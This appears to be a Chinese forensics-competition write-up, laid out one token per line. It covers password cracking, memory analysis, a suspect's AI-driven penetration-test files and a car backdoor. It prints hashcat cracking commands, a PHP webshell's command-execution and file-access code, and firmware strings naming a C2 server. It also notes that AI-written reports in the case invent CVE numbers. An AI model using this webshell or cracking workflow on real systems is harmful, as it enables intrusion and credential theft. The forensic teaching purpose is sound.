+'123456'
+,
+'Liuyang'
+,
+'Yangliu'
+]
+for
+p1
+in
+parts1
+:
+for
+n
+in
+range
+(
+3
+,
+6
+):
+# 3~5 digits
+for
+i
+in
+range
+(
+10
+**
+n
+):
+pwds
+.
+append
+(
+f
+'
+{
+p1
+}
+@
+{
+i
+:
+0
+{
+n
+}
+d
+}
+'
+)
+with
+open
+(
+r
+'combo.txt'
+,
+'w'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+for
+p
+in
+pwds
+:
+f
+.
+write
+(
+p
++
+'
+\n
+'
+)
+print
+(
+f
+'Generated
+{
+len
+(
+pwds
+)
+}
+passwords'
+)
+修正: 密码提示
+检材中其实给了密码格式的提示, 只不过有点不容易找到.
+在用户"刘洋"的下载目录中可以看到
+1Password.rar
+压缩包, 其中注释包含密码的格式, 为
+姓名全拼@4位数字
+:
+用 HashCat 及字典爆破密码:
+PowerShell
+hashcat
+.
+exe
+-m
+8200
+-a
+0
+'D:\CaseFiles\FileOutput\rearanged.hash'
+'D:\CaseFiles\FileOutput\combo.dict'
+16 请给出用户刘洋的开机密码?
+¶
+答案
+6yang@2o26
+接上题, 下载/导出镜像中的 1password 客户端或者使用仿真系统中的 1password.
+如果使用本地的 1password 客户端, 可以通过同步文件夹的方式导入
+liuyang.opvault
+:
+一共保存了 6 条密码:
+其中有 1 条被删除, 位于 Trash 中.
+17 请给出 pve 服务器的管理密码?
+¶
+答案
+pgscup2o@6
+PVE 服务器的密码被隐藏在空标签中, 需要点击 Edit 编辑才能看到密码:
+18 找出计算机内的加密工具脚本, 给出该加密工具的 SHA1
+¶
+答案
+7860dc719e0bd9fddc2eafd6708ecf204d744ae7
+在 1password 中得到的 VeraCrypt 容器密码为
+pgscup
+的 MD5 哈希值
+8687f7d845649e03d02d4ff1f36ec952
+和 PIM 为 2026, 可以挂载容器的隐藏分区. 使用先前分析过程中找到的密钥文件图片和 PIM 2026 可以挂载普通分区.
+普通分区中包含的文件:
+隐藏分区中包含的文件:
+普通分区中的
+encrypt_tool.py
+文件为加密工具, 计算其 SHA1 哈希值为
+7860dc719e0bd9fddc2eafd6708ecf204d744ae7
+.
+19 该脚本加密工具在进行脚本加密时, 最后一层是进行什么操作?
+¶
+答案
+十六进制转换
+接上题. 脚本的 DOC 里就有写到加密操作:
+Python
+"""
+加密工具 - 用于服务器取证
+适用于数据库备份
+加密层次：
+第1层: XOR加密 (密钥: 0x5A, 位置偏移 i%256)
+第2层: Base64编码
+第3层: 字符替换表 (ABCD...+/ -> ZYXW...+/)
+第4层: 十六进制转换
+用法:
+python encrypt_tool.py --input <文件路径> --output <输出路径>
+python encrypt_tool.py <输入路径> <输出路径>
+python encrypt_tool.py --db --output <输出路径>
+"""
+查看源码发现最后一步操作确实是输出 16 进制:
+Python
+def
+obfuscate
+(
+data
+):
+"""4层混淆加密"""
+step1
+=
+xor_encrypt
+(
+data
+)
+step2
+=
+base64
+.
+b64encode
+(
+step1
+.
+encode
+(
+'utf-8'
+))
+.
+decode
+(
+'ascii'
+)
+step3
+=
+char_swap_encode
+(
+step2
+)
+step4
+=
+step3
+.
+encode
+(
+'utf-8'
+)
+.
+hex
+()
+return
+step4
+20 请解密该脚本加密工具加密的文件
+database.php.obf
+, 给出该文件内的数据库密码
+¶
+答案
+pgscup@o26
+在脚本中就存储了数据库的信息:
+Python
+db_user
+=
+'root'
+db_pass
+=
+'pgscup@o26'
+db_name
+=
+'jinqin'
+password
+=
+'JDSJ2026@Backup'
+可以复用加密脚本中的函数进行解密:
+Python
+from
+encrypt_tool
+import
+xor_encrypt
+,
+char_swap_encode
+with
+open
+(
+"./database.php.obf"
+,
+"r"
+)
+as
+file
+:
+data
+=
+file
+.
+read
+()
+data1
+=
+bytes
+.
+fromhex
+(
+data
+)
+data2
+=
+char_swap_encode
+(
+data1
+.
+decode
+())
+from
+base64
+import
+b64decode
+data3
+=
+b64decode
+(
+data2
+.
+encode
+())
+data4
+=
+xor_encrypt
+(
+data3
+.
+decode
+())
+print
+(
+data4
+)
+得到解密后的 php 脚本:
+PHP
+<?php
+return
+[
+'default'
+=>
+env
+(
+'DB_CONNECTION'
+,
+'mysql'
+),
+'connections'
+=>
+[
+'mysql'
+=>
+[
+'driver'
+=>
+'mysql'
+,
+'host'
+=>
+env
+(
+'DB_HOST'
+,
+'127.0.0.1'
+),
+'port'
+=>
+env
+(
+'DB_PORT'
+,
+'3306'
+),
+'database'
+=>
+env
+(
+'DB_DATABASE'
+,
+'jinqin'
+),
+'username'
+=>
+env
+(
+'DB_USERNAME'
+,
+'root'
+),
+'password'
+=>
+env
+(
+'DB_PASSWORD'
+,
+'pgscup@o26'
+),
+],
+],
+];
+21 找出刘洋计算机内的
+交易信息.rar
+, 给出该文件的打开密码
+¶
+答案
+pgscup@9541
+参考本部分第 16 题, 在 1password 中看到密码格式为
+pgscup@4位数字
+.
+参考本部分第 18 题, 在 VeraCrypt 容器的隐藏卷中找到
+交易信息.rar
+文件.
+使用
+rar2john
+提取
+交易信息.rar
+的哈希:
+PowerShell
+rar2john
+.
+exe
+'D:\CaseFiles\FileOutput\交易信息.rar'
+得到哈希:
+Text Only
+D:\CaseFiles\FileOutput\交易信息.rar:$rar5$16$8d8faff6c57d5b4dad8f8b2e2ee40bc7$15$c900a6b1533badc4e0af19a5825e6273$8$4120b2b120c0ff78
+D:\CaseFiles\FileOutput\交易信息.rar:$rar5$16$8d8faff6c57d5b4dad8f8b2e2ee40bc7$15$f32f70bbcf35a41f7335a6bba607e693$8$4120b2b120c0ff78
+D:\CaseFiles\FileOutput\交易信息.rar:$rar5$16$8d8faff6c57d5b4dad8f8b2e2ee40bc7$15$21816cdf7b58196bced695c48f598d13$8$4120b2b120c0ff78
+D:\CaseFiles\FileOutput\交易信息.rar:$rar5$16$8d8faff6c57d5b4dad8f8b2e2ee40bc7$15$aab8b7ec1b7a93202a357346fbd0e3df$8$4120b2b120c0ff78
+D:\CaseFiles\FileOutput\交易信息.rar:$rar5$16$8d8faff6c57d5b4dad8f8b2e2ee40bc7$15$3b5cd5e6272502a540820dfe9892fcbe$8$4120b2b120c0ff78
+选取其中任意 1 条, 使用 HashCat 进行掩码爆破:
+PowerShell
+hashcat
+.
+exe
+-m
+13000
+-a
+3
+'$rar5$16$8d8faff6c57d5b4dad8f8b2e2ee40bc7$15$c900a6b1533badc4e0af19a5825e6273$8$4120b2b120c0ff78'
+'pgscup@?d?d?d?d'
+22 找出刘洋计算机内刘桂荣的身份证号码?
+¶
+答案
+420100194707075594
+420100200106295186
+500000196606302245
+接上题, 解压
+交易信息.rar
+之后, 其中包含以下文件:
+在
+user_real.xlsx
+中可以搜索到 4 个"刘桂荣", 这 4 条数据的身份证号各不相同:
+通过
+在线工具
+校验, 其中有 3 条合法的身份证号:
+另外, 在计算机镜像的 C 盘的文件碎片中也可以找到该文件:
+压缩包中的
+user_real.xlsx
+与文件碎片中的
+user_real.xlsx
+的哈希值一致, 为同一文件:
+刘洋计算机内存
+¶
+Info
+以下题目分析刘洋
+ly-memdump.mem
+镜像.
+01 给出用户刘洋的 NT 哈希值
+¶
+答案
+876dfe7bd78730b7b0baaf451414de8e
+使用 volitility3 的
+windows.hashdump
+插件:
+PowerShell
+python
+vol
+.
+py
+-f
+'Z:\刘洋\ly-memdump.mem windows.hashdump'
+在刘洋的计算机硬盘镜像的分析结果中也可以看到 NT 哈希:
+02 1Password 密码管理器的数据库文件名
+¶
+答案
+1Password10.sqlite
+使用 volitility3 的
+windows.pslist
+插件查找 1Password 的进程信息:
+PowerShell
+python
+vol
+.
+py
+-
+-filters
+1Password
+-f
+'Z:\刘洋\ly-memdump.mem windows.pslist'
+接着使用 volitility3 的
+windows.handle
+插件查找 1Password 的句柄信息, 过滤其中的文件句柄:
+PowerShell
+python
+vol
+.
+py
+-
+-filters
+"PID,6720"
+-f
+'Z:\刘洋\ly-memdump.mem windows.handle'
+|
+grep
+File
+可以看到
+1Password.exe
+有 1 个文件句柄访问了
+\Device\HarddiskVolume3\Users\鍒樻磱\AppData\Local\1Password\data\1Password10.sqlite
+, 还有 1 个文件句柄访问了先前分析中提到的
+\Device\HarddiskVolume3\Users\刘洋\Documents\1password\liuyang.opvault
+.
+03 1Password 在 VeraCrypt 启动后约多少分钟启动?
+¶
+答案
+2
+使用 volitility3 的
+windows.pslist
+插件查找 1Password 和 VeraCrypt 的进程信息:
+PowerShell
+# 使用 vol3 的 filters 正则
+python
+vol
+.
+py
+-
+-filters
+'ImageFileName,(?:1Password|VeraCrypt)!'
+-f
+'Z:\刘洋\ly-memdump.mem'
+windows
+.
+pslist
+# 使用 PowerShell 的 Select-String 进行匹配
+python
+vol
+.
+py
+-f
+'Z:\刘洋\ly-memdump.mem'
+windows
+.
+pslist
+|
+Select-String
+-Pattern
+'1Password|VeraCrypt'
+可以看到 2 个应用的启动时间分别是
+01:34:47
+和
+01:37:02
+, 相差 2 分 15 秒.
+黄志远计算机
+¶
+Info
+以下题目分析黄志远
+PC.E01
+镜像.
+这部分题目顺序非常乱且不合逻辑, 这里进行了顺序调整.
+并且这部分题目存在严重的命题错误和缺乏技术考察点的问题, 不建议任何人通过这部分题目进行学习.
+01 黄志远使用的 ai agent 的名称是什么?
+¶
+答案
+Hermes
+在火眼的 Linux 基本信息 -> 历史命令 分析结果中可以看到运行 Hermes 的指令:
+Hermes 的数据目录位于
+PC.E01/分区2/home/kali/.hermes
+02 黄志远使用的模型 api Key
+¶
+答案
+[REDACTED_API_KEY]
+接上题, 在
+PC.E01/分区2/home/kali/.hermes/config.yaml
+中保存着 Hermes 的配置信息, 其中可以看到默认使用的模型信息:
+YAML
+model
+:
+default
+:
+deepseek-chat
+provider
+:
+custom
+base_url
+:
+https://api.deepseek.com
+api_key
+:
+[REDACTED_API_KEY]
+api_mode
+:
+chat_completions
+使用的 API Key 为
+[REDACTED_API_KEY]
+.
+另外, 在 Hermes 的配置中还存在 Kimi 的 API Key, 但实际上没有正常使用, 在
+session
+目录中的 jsonl 文件中可以看到所有调用
+kimi-k2.5
+模型的会话记录均只有 1 条来自用户的消息:
+查看对应的
+request_dump*.json
+文件后可以发现这些请求的响应均为
+401 Invalid Authentication
+, 意味着 Hermes 中保存的 Kimi API Key 无效:
+另外, 在这里还能发现出题人意外泄露的 Deepseek API Key.
+03 请分析
+渗透.rar
+文件, 黄志远总共攻击了多少台主机
+¶
+答案
+16
+题目中提到的
+渗透.rar
+文件位于
+PC.E01/分区2/home/kali/
+目录; 同一目录中还存在
+渗透密码
+目录, 其中保存了 500 个 png 文件, 是根据
+PC.E01/分区2/home/kali/Reference.png
+切分出的图片块.
+由于图片中相同的白色块过多, 导致 GAPS 的迭代速度非常慢, 无法使用. 好在浏览图块之后可以很明显地看到红色的文字:
+拼一下可以看到文字
+今晚去杀鬼
+, 为
+渗透.rar
+的解压密码:
+压缩包中包含以下文件:
+每个
+渗透测试报告_*.md
+是用 Hermes 对一台主机攻击后生成的报告.
+另一种做法
+本题及之后对
+渗透.rar
+进行分析的题目, 部分可通过分析 Hermes 的 session 文件
+session_20260417_214016_41942e.json
+来找到答案.
+04 反编译
+exploit
+二进制文件, 发现其调用了
+setuid()
+、
+setgid()
+和
+system("/bin/bash")
+, 该程序的源文件编译前名称是什么?
+¶
+答案
+exploit.c
+在二进制文件的字符串符号表中可以看到源文件名
+exploit.c
+:
+用 Strings 也能看到:
+或者解析 Hermes 的 Checkpoint
+e9671acd244849c5
+也可以看到:
+05 (Webshell 功能逻辑研判) 观察
+file_shell.php
+的源码，若攻击者请求
+?download=/etc/passwd
+, 程序执行的核心函数是什么?
+¶
+答案
+readfile
+在压缩包内的
+file_shell.php
+文件中看到, 通过
+readfile
+函数读取文件, 相关代码为:
+PHP
+if(isset($_GET['download'])) {
+$file = $_GET['download'];
+if(file_exists($file)) {
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="'.basename($file).'"');
+readfile($file);
+exit;
+}
+}
+06 (Webshell 下载参数逻辑) 源码中通过设置哪个 Header 实现浏览器自动弹出下载框?
+¶
+答案
+Content-Disposition
+接上题, 设置了 2 个 Header, 分别是
+Content-Type
+和
+Content-Disposition
+, 前者用于设置内容类型, 后者用于设置内容应该被显示在网页上还是作为文件下载.
+07 Webshell 命令执行参数若要利用
+file_shell.php
+获取当前系统的用户权限, 正确的 URL 参数构造是什么?
+¶
+答案
+cmd=id
+接上题, 相关代码如下:
+PHP
+if(isset($_GET['cmd'])) {
+system($_GET['cmd']);
+}
+Linux 中通过
+id
+指令查看当前用户的权限信息, 因此需要 GET 请求传参
+cmd=id
+.
+08 根据
+file_shell.php
+源码, 文件上传功能使用哪个 PHP 函数将临时文件移动到目标路径?
+¶
+答案
+move_uploaded_file
+接上题, 相关代码如下:
+PHP
+if(isset($_FILES['file'])) {
+$target = basename($_FILES['file']['name']);
+if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+echo "File uploaded: $target<br>";
+}
+}
+09 (Webshell 目录处理逻辑) 文件上传功能中，源码将上传后的文件命名为什么?
+¶
+答案
+$_FILES['file']['name']
+接上题. 文件名被命名为上传时的原始文件名
+$_FILES['file']['name']
+.
+10 (Nikto 扫描结果) 发现通过发送超长斜杠序列可以探测目录列举漏洞, 该漏洞对应的 CVE 编号是什么?
+¶
+答案
+CVE-2002-1078
+在压缩包内的
+pentest-lab/nikto_scan.txt.txt
+文件中可以看到 Nikto 的扫描结果, 其中第 14 行为题目中提及的漏洞, CVE 编号为
+CVE-2002-1078
+:
+11 (SQLite 数据库结构分析) 在
+users
+表的定义中,
+id
+字段使用了
+AUTOINCREMENT
+. 这意味着什么?
+¶
+本题存疑
+本题存疑
+没搞懂题目在问什么.
+users
+表的结构如下:
+SQL
+CREATE
+TABLE
+users
+(
+id
+INTEGER
+PRIMARY
+KEY
+AUTOINCREMENT
+,
+username
+TEXT
+NOT
+NULL
+,
+password
+TEXT
+NOT
+NULL
+,
+role
+TEXT
+DEFAULT
+'user'
+)
+按照实际情况来看,
+id
+字段带
+AUTOINCREMENT
+且为主键时, 数据库可以无限制地添加重复用户信息.
+12 (数据库存储安全性评估)
+users
+表的密码存储存在什么安全隐患?
+¶
+本题存疑
+官方答案: CVE-2026-0005
+我的答案: 明文存储密码
+根据先前看到的
+user
+表内容, 很明显存在明文存储密码的问题. 问题在于, 大模型由于幻觉问题编造了一个错误的 CVE 编号(CVE-2026-0005, 该 CVE 实际上是 Android 系统的漏洞). 在渗透测试报告中搜索
+users
+可以看到对应的内容:
+Markdown
+### 高危漏洞 (High)
+4.
+**CVE-2026-0004**
+: 数据库权限配置错误
+-
+CVSS评分: 7.5
+-
+影响: 数据库文件可读可写
+-
+修复建议: 设置适当的文件权限 (600)
+4.
+**CVE-2026-0005**
+: 明文密码存储
+-
+CVSS评分: 7.4
+-
+影响: 密码泄露风险
+-
+修复建议: 使用强哈希算法存储密码
+13 在
+address_book.db
+中，管理员密码
+Str0ngP@ssw0rd2026!
+是什么角色?
+¶
+本题存疑
+admin
+依然看不懂题目. 和"角色"相关的东西好像只有
+users
+表的
+role
+字段了.
+14 (数据规模与风险评估) 遭受泄露的个人联系人信息条数大约为多少?
+¶
+答案
+15000
+在
+contacts
+表中, 去一下重, 一共 15000 条:
+15 (API 端口风险判定) 8000 端口运行的技术组件是什么?
+¶
+答案
+FastAPI
+搜索后可以找到渗透报告中提及到 8000 端口的位置, 运行了 FastAPI:
+16 (API 环境交互日志价值) 未授权访问 8000 端口日志接口, 最可能导致哪类敏感信息泄露?
+¶
+本题存疑
+按照答案格式只能填
+/api/logs
+符合题意的答案应该是: 通话记录, AI 交互日志, 用户输入数据
+接上题, 渗透测试报告中提到了 3 类信息泄露:
+通话记录
+AI 交互日志
+用户输入数据
+但题目的答案格式却是
+/api/xxx
+, 真没招了.
+17 (文件上传漏洞利用条件) 利用
+upload.php
+上传漏洞后, 攻击者利用 Webshell 前最关键的一步是什么?
+¶
+本题存疑
+官方答案:
+\uploads
+我的答案: 获得上传路径
+依旧是看不懂题目在问什么. 在渗透测试报告里搜索
+upload.php
+可以看到相关的内容:
+报告中提到已经存在了几个 WebShell:
+uploads/advanced.php
+uploads/fileshell.php
+uploads/shell.php
+但是也没有提到所谓的"前最关键的一步".
+18 根据通讯录管理系统漏洞清单, CVE-2026-0003 (无限制文件上传漏洞) 的 CVSS 评分是多少?
+¶
+答案
+8.8
+依旧是大模型虚构的 CVE 编号, 只能根据渗透测试报告来做, 评分是
+8.8
+(高危):
+(讲个题外话, Copy Fail 的 CVSS 评分才 7.8)
+19 (Web 目录遍历隐患)
+uploads/
+目录启用目录列表功能通常由哪个组件控制?
+¶
+答案
+mod_autoindex
+在渗透测试报告中搜索, 只找到了这些内容:
+Apache 的
+.htaccess
+中如果对目录开启了
+Indexes
+选项, 则会由
+mod_autoindex
+模块进行目录遍历.
+20 (系统运行权限分析) Web 服务器运行的用户身份是什么?
+¶
+答案
+www-data
+一般 Web 服务器都运行在 www 用户组的 www-data 用户:
+21 (命令行注入漏洞识别) 验证
+tools.php
+命令执行漏洞时, 哪个命令返回了 uid 的值
+¶
+答案
+id
+在渗透测试报告中搜索, 提到
+id
+返回了 uid:
+22 (数据库物理路径获取) 攻击者通过
+generate_data.php
+得知数据库在服务器上的绝对物理路径是什么?
+¶
+答案
+/var/www/html/address_book.db
+在渗透测试报告中搜索, 提到数据库的绝对路径为
+/var/www/html/address_book.db
+:
+23 (身份验证策略评估) 系统中存在的弱密码策略漏洞不包括哪项?
+¶
+本题存疑
+本题存疑
+疑似是选择题没给选项. 在渗透测试报告中搜索, 提到了 2 组弱口令:
+24 (攻击路径逻辑推演) 攻击者获取持久访问权限的最典型方式是什么?
+¶
+答案
+WebShell
+在渗透测试报告中搜索, 提到使用 WebShell 持久化访问:
+25 (漏洞 CVE 编号识读) 被标识为未授权命令执行漏洞的虚拟 CVE 编号是什么?
+¶
+答案
+CVE-2026-0002
+在渗透测试报告中搜索, 虚拟的 CVE 编号为
+CVE-2026-0002
+:
+26 (系统修复优先级研判) 24 小时紧急加固中, 哪项不属于立即修复级别?
+¶
+本题存疑
+?
+真没招了. 比赛的时候看了几遍页面源码, 以为是不是我没看见选项在哪儿.
+27 (管理员凭据有效性验证) 利用管理员密码, 攻击者在哪个页面时才能生效?
+¶
+本题存疑
+?
+依然看不懂题目.
+28 本系统使用的后端数据库技术是什么?
+¶
+答案
+SQLite
+在渗透测试报告中搜索, 使用的数据库是 SQLite 数据库:
+29 目标系统运行的 Apache 具体版本号是什么?
+¶
+答案
+2.4.66
+在渗透测试报告中搜索, 服务使用的 Apache 版本为
+2.4.66
+:
+30 根据通讯录管理系统漏洞清单, CVE-2026-0001 (敏感信息泄露漏洞)的 CVSS 评分是多少?
+¶
+答案
+9.8
+在渗透测试报告中搜索, CVE-2026-0001 的 CVSS 评分为 9.8:
+31 攻击者最终获取了什么角色的权限?
+¶
+答案
+root
+在渗透测试报告中搜索, 有获取到 root 权限:
+黄志远汽车车机
+¶
+Info
+以下题目分析黄志远
+car.E01
+检材.
+挂载镜像, 可以发现镜像包含 1 个 EXT 分区, 目录结构类似于 Android 系统.
+我也是第 1 次接触汽车取证, 正好学习一下.
+汽车取证
+¶
+注意
+以该检材为例, 不同设备的目录结构可能有所不同.
+这个检材不像是正常的汽车检材. 一般来说, T-Box, EDR, 中控等组件的数据应该分别单独提取才对, 不应该形成一整个完整的镜像.
+车辆身份与系统信息
+¶
+system/etc/build.prop
+: 包含 VIN 码、车型、ADAS 配置、工程模式 root 权限等信息
+default.prop
+、
+vendor/build.prop
+: 系统属性、安全配置
+VIN 码
+汽车 VIN 码, 全称 Vehicle Identification Number, 译为车辆识别码, 常称作"车架号". 每个 VIN 码对应唯一的一辆车.
+VIN 码由 17 位字符组成, 包含数字和字母. 为了避免混淆, 英文字母I、O、Q不使用. VIN 码的组成为:
+3 位 WMI (World Manufacturer Identifier, 世界制造厂识别代号): 我国常见的 WMI 有
+LSG: 上汽通用
+LSV: 上汽大众
+LFV: 一汽大众
+LHG: 广州本田
+LVS: 长安福特
+LS5: 长安汽车
+LHB: 北汽福田
+LC0: 比亚迪新能源
+6 位 VDS (Vehicle Descriptor Section, 车辆说明部分): 说明车辆的一般特性.
+8 位 VIS (Vehicle Indicator Section, 车辆指示部分): 车辆制造商为了区别不同车辆而指定的编码, 第 1 位字符代表生产年份.
+例如, 本检材中, 可以在
+system/etc/build.prop
+中看到
+ro.vehicle.vin=LSGXE53W7PS012345
+, 其中的
+LSG XE53W7 PS012345
+即为检材来源车辆的 VIN 码. 通过 VIN 码可以得知, 这是一辆由上汽通用于 2023 年生产的汽车.
+行车记录仪数据
+¶
+行车记录仪的数据存储在
+dashcam
+目录中, 目录结构如下:
+dashcam
+目录: 行车记录仪的数据目录
+DCIM
+目录: 视频文件存储目录
+EVENT
+目录: 存储事件(碰撞、急刹车等)触发的视频
+NORMAL
+目录: 存储常规录制视频
+PARKING
+目录: 存储停车监控视频
+gps
+: 存储 GPS 轨迹数据
+metadata.json
+: 录制元数据
+EDR
+¶
+EDR
+EDR (Event Data Recorder, 事件数据记录器) 用于记录车辆碰撞前、碰撞时、碰撞后三个阶段中汽车的关键运行数据, 包括速度、ABS状态、安全带状态等.
+EDR 的数据存储在
+edr
+目录中, 目录结构如下:
+edr
+events
+: 事件数据
+snapshots
+: 事件快照数据
+T-Box
+¶
+T-Box
+T-BOX (远程信息处理控制单元) 是集成车身网络和无线通讯功能的智能终端设备, 通过连接车载 CAN 总线和外部云平台, 实现不同车辆、车辆与基础设施、车辆与互联网之间的通信和数据交换.
+T-BOX 通常包含 GPS 模块、蜂窝网络模块.
+T-Box 的数据存储在
+tbox
+目录中, 目录结构如下:
+tbox
+comm
+: 通信记录
+gnss
+: GNSS 位置数据
+log
+: T-Box 日志
+config
+: 配置信息
+ota
+: OTA 更新记录
+OBD
+¶
+存储在
+/obd
+目录中, 包含车辆历史故障信息, 例如速度、发动机状态、出现的故障码等.
+OBD
+OBD (On-Board Diagnostics, 车载诊断数据) 是指车辆的自我诊断和报告能力. 现代车载诊断器使用标准化数字通信端口来提供实时数据和诊断故障代码, 从而快速识别车辆内部的故障.
+应用程序数据
+¶
+与 Android 手机相似, 应用数据存储在
+data/data
+目录中.
+系统日志
+¶
+data/log
+canbus
+: CAN 总线日志.
+dlt
+: DLT 日志目录.
+adas
+: ADAS 日志目录.
+power
+: 电源管理日志.
+CAN Bus
+CAN (Controller Area Network, 控制器区域网络) 是一种车辆接口标准, 主要实现 EC (电子控制单元) 间的高效通信, 也被用于各种其他环境中, 例如 3D 打印.
+CAN 是一种广播协议, 通过"仲裁"过程确保数据完整性和优先级: 如果多个设备试图同时发送数据，则允许最高优先级的设备继续传输, 其他设备后退. CAN 协议的常见版本有 CAN 2.0、CAN FD 和 CAN XL.
+DLT
+DLT (Diagnostic Log and Trace, 系统诊断日志) 是 AUTOSAR (AUTomotive Open System ARchitecture, 汽车开放系统架构) 标准的诊断日志协议, 记录 ECU (Electronic Control Unit, 电子控制单元) 级别的关键事件.
+ADAS
+ADAS (Advanced Driver-Assistance System, 高级驾驶员辅助系统) 是协助驾驶员安全操作车辆的技术. ADAS 使用传感器和摄像头等自动化技术来检测附近的障碍物或驾驶员错误并做出相应响应, 实现不同级别的辅助驾驶或自动驾驶.
+01 事故发生前车辆发生了非驾驶员意图的左转, 找出控制车辆异常转向的恶意指令 ID
+¶
+答案
+0A0
+根据题目提及到"车辆发生了非驾驶员意图的左转", 推断可能是辅助驾驶功能出现了异常.
+/data/log
+文件夹中没有保存 ADAS 的日志. 但通过文件内容搜索, 可以在 DLT 文件
+data/log/dlt/system.dlt
+中发现与 ADAS 相关的诊断信息:
+Text Only
+DLT_TIME         APP_ID CTX_ID LVL MSG
+--------------------------------------
+1702654000.123   ADAS   SENS   INFO Start radar initialization
+1702654500.221   ADAS   CTRL   WARN Override Active: LKA requested steer [-45deg]
+1702654800.500   CGW    ROUT   ERR  Invalid CRC on msg 0x0A0
+1702655100.001   SYS    SAFE   FATL COLLISION_DETECTED!!
+第 2 条信息
+WARN Override Active: LKA requested steer [-45deg]
+表明 LKA (Lane Keep Assistant, 车道保持辅助) 发出了转向 -45 度 (左转 45 度) 的请求, 这显然超出了车道保持辅助的修正范围.
+第 3 条消息
+ERR  Invalid CRC on msg 0x0A0
+表明 CGW 检测到 1 条 ID 为
+0x0A0
+的消息出现 CRC 检验错误, 报文被篡改或伪造.
+第 4 条消息
+FATL COLLISION_DETECTED!!
+表明系统模块检测到碰撞.
+CGW
+CGW (Central Gateway Control Unit, 中央网关控制单元) 是汽车通信网络中的重要组成部分, 是多个控制单元的中心, 在 ECU (Engine Control Unit, 发动机控制单元)、仪表组及各种系统之间交换数据.
+CGW 负责处理和分发传感器数据、控制致动器并监控系统的故障以及诊断和修复通信网络内的故障.
+CAN ID
+CAN ID 是 CAN 总线上的消息标识符, 范围 0x000-0x7FF. 每个 ID 对应一个固定的信号组, 由 OEM 在 DBC 文件中定义.
+从
+.asc
+文件提取 ID:
+Text Only
+0.002665 1  050  Rx  d 8 3E 24 62 0B D0 94 DC 5F
+↑    ↑         ↑
+通道    ID      数据(8字节)
+确定每个 ID 含义的方法
+通过 DBC 文件
+¶
+DBC 是 OEM 定义的 CAN 信号映射表, 格式如:
+Text Only
+BO_ 1280 ADAS_Steering: 8 ADAS
+SG_ SteeringAngle : 0|16@1+ (0.1,-500) [-500|500] "deg" EPS
+SG_ TorqueRequest : 16|8@1+ (0.5,0) [0|100] "Nm" EPS
+本检材中没有 DBC, 无法使用该方法获取 CAN ID 定义.
+OBD-II 标准 ID
+¶
+参考:
+OBD-II PID
+本检材涉及到的 ID (0x050/0x0A0/0x1F4/0x2B1/0x3C2) 是 OEM 私有 ID, 不在标准 OBD 范围内. 因此, 无法使用该方法获取 CAN ID 定义.
+逆向固件
+¶
+*_ecu.bin
+为 ECU 固件, 可以通过分析组件的 ECU 固件来获取 CAN ID.
+经过尝试, 本题给出的 ADAS 固件无法逆向, 只能根据字符串进行推测:
+DIAG_TEST_OVERRIDE_STEERING_FOR_CALIBRATION_ONLY_DO_NOT_USE_IN_PROD
+//BACKDOOR_HOOK_LKAS_OVERRIDE//C2_SERVER=45.33.22.11:8443
+TRIGGER=SPEED>120
+ACTION=STEER_LEFT_15_DEG
+02 分析动力总成总线日志, 判定驾驶员在碰撞发生前的最后 5 秒内, 是否真正尝试了手动踩下制动踏板? 若有, 请说明判定依据; 若无, 请提交其加速踏板的百分比数值
+¶
+本题存疑
+本题存疑
+接上题, 根据 DLT 文件的最后一条:
+Text Only
+1702655100.001   SYS    SAFE   FATL COLLISION_DETECTED!!
+可以得到碰撞发生的时间戳为
+1702655100.001
+, 时间为
+2023-12-15 23:45:00
+.
+动力总成总线日志是
+/data/log/canbus/powertrain_can.asc
+, 使用 Savvy CAN 工具查看该文件, 发现该记录的起始时间为
+2025-12-15 23:45:00
+, 跟前面的时间对不上. 只能推测该文件中最后 5 秒的数据为碰撞发生前的最后 5 秒的数据, 可以看到所有数据均为
+1  050   Rx   d 8 00 00 00 00 00 00 00 00
+, 应该是某个设备发送的空数据.
+由于缺少该车型(东风风行 S7)的 dbc 数据, 因此无法解析 CAN ID 对应的数据. 而通用的 j1939 无法正确解析该文件中包含的 CAN ID.
+03 攻击者通过同频注入压制了原车 ADAS 信号. 请在日志中找出证明这是"人为注入攻击"而非"ECU 原生故障"的报文频率特征描述.
+¶
+答案
+U0001
+在 OBD 日志
+/obd/history/dtc_records.log
+中, 可以看到:
+Text Only
+STAROS_DTC_LOG_V1
+TIMESTAMP: 2025-12-15T23:45:01Z
+--- ACTIVE DTCS ---
+U0001: High Speed CAN Communication Bus (Powertrain Node)
+U0100: Lost Communication With ECM/PCM A
+B0070: Driver Seatbelt Pretensioner Deployment Control (Crash detected)
+C0561: System Disabled Information Stored (ABS/ESP disabled by impact)
+--- HISTORY DTCS ---
+U140A: Implausible Security Access Attempt (Gateway)
+P0610: Control Module Vehicle Options Error (Possible unauthorized firmware flash)
+日志的时间与事故发生时间一致, 激活状态的错误代码包括
+U0001: High Speed CAN Communication Bus (Powertrain Node)
+, 意为"动力系统节点在 CAN Bus 发出了高频请求".
+04 分析动力总成总线日志, 确定车辆由于碰撞导致轮速传感器信号彻底消失(归零)的确切时间点(秒).
+¶
+答案
+120
+根据题目描述推断, 在
+powertrain_can.asc
+文件中出现的 CAN ID 中有一个对应了轮速传感器, 并且题目中提到信号归零, 符合的 CAN ID 是
+0x050
+:
+在 120.000139 时首次出现全零数据, 此后至日志结束持续为全零.
+05 基于安全通讯协议, 部分关键报文需带有 MAC 认证. 请找出恶意转向报文中, 证明其为非法注入的最直接协议层安全缺陷项.
+¶
+本题存疑
+本题存疑
+06 逆向分析 ADAS 固件, 指出其中隐藏的恶意控制代码被触发所需的最低车速阈值(单位: km/h).
+¶
+答案
+120
+一般来说 ADAS 固件应该是 ARM Cortex 32位 Little Endian 的二进制文件, 但是 8MB 的固件文件里只有 1KB 的字节是非 0 的, 很不正常. 并且用 Binwalk 也识别不到二进制代码.
+用 Ghidra 加载固件并且创建代码段 0x8400000 ~ 0x84003F0 后, 依然无法正常反编译. 只能根据 Strings 找到的字符串来推断:
+DIAG_TEST_OVERRIDE_STEERING_FOR_CALIBRATION_ONLY_DO_NOT_USE_IN_PROD
+//BACKDOOR_HOOK_LKAS_OVERRIDE//C2_SERVER=45.33.22.11:8443
+TRIGGER=SPEED>120
+ACTION=STEER_LEFT_15_DEG
+07 事故车辆的发动机控制系统已被黑客篡改. 请指出其为了获得超高速动力, 在固件中非法解除了哪个速度限制相关的标志?
+¶
+答案
+VMAX_LIMIT
+同上题. 动力系统的固件也无法正常逆向, 通过 Strings 获取字符串:
+可以看到
